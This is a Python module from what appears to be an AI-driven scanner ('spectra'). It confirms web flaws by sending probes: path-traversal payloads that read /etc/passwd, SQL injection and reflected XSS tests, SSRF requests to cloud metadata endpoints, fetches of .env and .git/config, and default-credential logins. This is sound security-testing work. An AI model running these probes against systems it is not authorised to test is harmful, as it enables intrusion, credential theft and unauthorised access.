"""
Web Exploit Verifier.

Verifies web vulnerabilities by making targeted HTTP requests.
Lightweight alternative to Playwright-based browser verification.
"""

import logging
from typing import Any

import httpx

logger = logging.getLogger("spectra.ai.agents.web_verifier")


async def verify_web_vulnerability(
    target_url: str,
    vuln_type: str,
    vuln_details: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Verify a web vulnerability by sending targeted HTTP requests.

    Returns dict with:
        verified: bool
        evidence: str (response snippet proving the vuln)
        method: str (how it was verified)
    """
    try:
        async with httpx.AsyncClient(
            timeout=10, follow_redirects=True, verify=False
        ) as client:

            if vuln_type in ("path_traversal", "lfi"):
                return await _verify_path_traversal(client, target_url)

            elif vuln_type in ("sqli", "sql_injection"):
                return await _verify_sqli(client, target_url)

            elif vuln_type in ("xss", "cross_site_scripting"):
                return await _verify_xss(client, target_url)

            elif vuln_type in ("ssrf", "server_side_request_forgery"):
                return await _verify_ssrf(client, target_url)

            elif vuln_type in ("info_leak", "information_disclosure"):
                return await _verify_info_leak(client, target_url)

            elif vuln_type in ("default_creds", "auth_bypass"):
                return await _verify_default_creds(
                    client, target_url, vuln_details
                )

            else:
                response = await client.get(target_url)
                return {
                    "verified": response.status_code < 500,
                    "evidence": f"HTTP {response.status_code}, {len(response.text)} bytes",
                    "method": "http_probe",
                }

    except Exception as e:
        return {"verified": False, "evidence": f"Error: {e}", "method": "failed"}


async def _verify_path_traversal(
    client: httpx.AsyncClient, url: str
) -> dict:
    """Check for path traversal by requesting /etc/passwd."""
    payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
    ]
    for payload in payloads:
        test_url = f"{url.rstrip('/')}/{payload}"
        try:
            resp = await client.get(test_url)
            if "root:" in resp.text and "/bin/" in resp.text:
                return {
                    "verified": True,
                    "evidence": resp.text[:200],
                    "method": f"path_traversal: {payload}",
                }
        except Exception:
            continue
    return {
        "verified": False,
        "evidence": "No traversal payload succeeded",
        "method": "path_traversal",
    }


async def _verify_sqli(client: httpx.AsyncClient, url: str) -> dict:
    """Check for SQL injection with error-based detection."""
    test_url = f"{url}'" if "?" in url else f"{url}?id=1'"
    try:
        resp = await client.get(test_url)
        sql_errors = [
            "sql syntax",
            "mysql",
            "postgresql",
            "sqlite",
            "ora-",
            "unclosed quotation",
        ]
        for err in sql_errors:
            if err in resp.text.lower():
                return {
                    "verified": True,
                    "evidence": f"SQL error detected: {err}",
                    "method": "error_based_sqli",
                }
    except Exception:
        pass
    return {
        "verified": False,
        "evidence": "No SQL errors triggered",
        "method": "sqli",
    }


async def _verify_xss(client: httpx.AsyncClient, url: str) -> dict:
    """Check for reflected XSS."""
    marker = "spectra_xss_test_12345"
    payload = f"<script>{marker}</script>"
    separator = "&" if "?" in url else "?"
    test_url = f"{url}{separator}q={payload}"
    try:
        resp = await client.get(test_url)
        if marker in resp.text:
            return {
                "verified": True,
                "evidence": f"Reflected: {marker}",
                "method": "reflected_xss",
            }
    except Exception:
        pass
    return {
        "verified": False,
        "evidence": "XSS payload not reflected",
        "method": "xss",
    }


async def _verify_ssrf(client: httpx.AsyncClient, url: str) -> dict:
    """Check for SSRF by requesting internal metadata endpoints."""
    test_urls = [
        f"{url}?url=http://169.254.169.254/latest/meta-data/",
        f"{url}?url=http://127.0.0.1:80/",
    ]
    for test_url in test_urls:
        try:
            resp = await client.get(test_url)
            if "ami-id" in resp.text or "instance-id" in resp.text:
                return {
                    "verified": True,
                    "evidence": "AWS metadata accessible",
                    "method": "ssrf_metadata",
                }
        except Exception:
            continue
    return {
        "verified": False,
        "evidence": "SSRF not confirmed",
        "method": "ssrf",
    }


async def _verify_info_leak(client: httpx.AsyncClient, url: str) -> dict:
    """Check for information disclosure."""
    sensitive_paths = [
        "/phpinfo.php",
        "/.env",
        "/.git/config",
        "/server-status",
        "/debug",
    ]
    base = url.rstrip("/")
    for path in sensitive_paths:
        try:
            resp = await client.get(f"{base}{path}")
            if resp.status_code == 200 and len(resp.text) > 100:
                if any(
                    kw in resp.text.lower()
                    for kw in [
                        "phpinfo",
                        "db_password",
                        "secret_key",
                        "[core]",
                        "server-status",
                    ]
                ):
                    return {
                        "verified": True,
                        "evidence": f"{path} exposed ({len(resp.text)} bytes)",
                        "method": "info_leak",
                    }
        except Exception:
            continue
    return {
        "verified": False,
        "evidence": "No info leaks found",
        "method": "info_leak",
    }


async def _verify_default_creds(
    client: httpx.AsyncClient, url: str, details: dict | None
) -> dict:
    """Check for default credentials on web login forms."""
    creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("root", "root"),
    ]

    for user, passwd in creds:
        try:
            resp = await client.post(
                url,
                data={
                    "username": user,
                    "password": passwd,
                    "user": user,
                    "pass": passwd,
                },
            )
            if (
                resp.status_code in (200, 302)
                and "invalid" not in resp.text.lower()
                and "error" not in resp.text.lower()
            ):
                return {
                    "verified": True,
                    "evidence": f"Login with {user}:{passwd}",
                    "method": "default_creds",
                }
        except Exception:
            continue
    return {
        "verified": False,
        "evidence": "No default creds worked",
        "method": "default_creds",
    }
